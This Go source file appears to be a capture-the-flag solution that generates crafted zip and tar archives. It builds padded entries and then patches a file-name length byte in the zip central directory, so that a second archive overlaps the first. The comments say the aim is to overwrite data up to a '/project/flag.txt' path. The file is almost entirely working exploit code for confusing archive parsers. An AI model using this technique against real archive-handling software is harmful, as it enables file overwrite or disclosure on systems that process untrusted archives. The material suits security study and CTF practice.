package main

import (
	"os"
	"strings"
	"bytes"
	"fmt"
	"archive/zip"
	"os/exec"
	"io/ioutil"
	"encoding/hex"
	"encoding/binary"
)

func step_one() {
	// go run 02_generate_archive.go && hexdump -C step_one.zip

	fmt.Println("step_one")

	out_file, _ := os.OpenFile("step_one.zip", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
	zw := zip.NewWriter(out_file)
	// Make sure the zip is large enough to overwrite up until the `/project/flag.txt`
	// text at around 0x420 in the tar archive, otherwise there will be a `/` in the
	// filename
	zw.Create(strings.Repeat("A", 64))
	zw.Create(strings.Repeat("B", 64))
	zw.Create(strings.Repeat("C", 64))
	zw.Create(strings.Repeat("Z", 192))
	zw.Close()
	out_file.Close()

	out, _ := exec.Command("unzip", "-o", "step_one.zip").Output()
	fmt.Println(string(out))

	out, _ = exec.Command("tar", "--overwrite", "-cvf", "step_one.tar", strings.Repeat("A", 64), strings.Repeat("B", 64), strings.Repeat("C", 64), strings.Repeat("Z", 192)).Output()
	fmt.Println(string(out))

	out, _ = exec.Command("rm", strings.Repeat("A", 64), strings.Repeat("B", 64), strings.Repeat("C", 64), strings.Repeat("Z", 192)).Output()
}

func step_two() {
	// go run 02_generate_archive.go && hexdump -C step_two.zip

	raw, _ := ioutil.ReadFile("step_one.zip")
	startLoc := bytes.Index(raw, []byte("PK\x05\x06")) // find zip1 end cDir
	directoryOffset := int(binary.LittleEndian.Uint32(raw[startLoc+16:startLoc+20]))
	fmt.Printf("directoryOffset %x\n", directoryOffset) // find zip1 directory offset

	endLoc := bytes.LastIndex(raw, []byte(strings.Repeat("Z", 192)))
	fmt.Printf("endLoc %x\n", endLoc) // find where last file name in zip1 starts

	fileName := raw[directoryOffset:endLoc]
	fmt.Println(fileName[len(fileName) - 18] == 192)
	fileName[len(fileName) - 17] = 0x04 // add 256 * 0x04 = 1024 to the file name length of the last chunk
	fmt.Println(hex.EncodeToString(fileName))

	fmt.Println("step_two")

	out_file, _ := os.OpenFile("step_two.zip", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
	zw := zip.NewWriter(out_file)
	fw, _ := zw.Create(string(fileName))
	// fw, _ := zw.Create(strings.Repeat("Z", len(fileName)))
	// Just enough to align to directoryOffset
	fw.Write([]byte("Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nam et ex nunc. Proin auctor nisl in molestie aliquam. Duis ut odio efficitur, pretium augue in, viverra "))

	zw.Close()
	out_file.Close()

	rawTwo, _ := ioutil.ReadFile("step_two.zip")
	checkFileName := rawTwo[directoryOffset:endLoc]
	fmt.Println(hex.EncodeToString(checkFileName))

	fmt.Println("Check", bytes.Equal(fileName, checkFileName))
}

func main() {
	// go run 02_generate_archive.go
	step_one()
	step_two()
}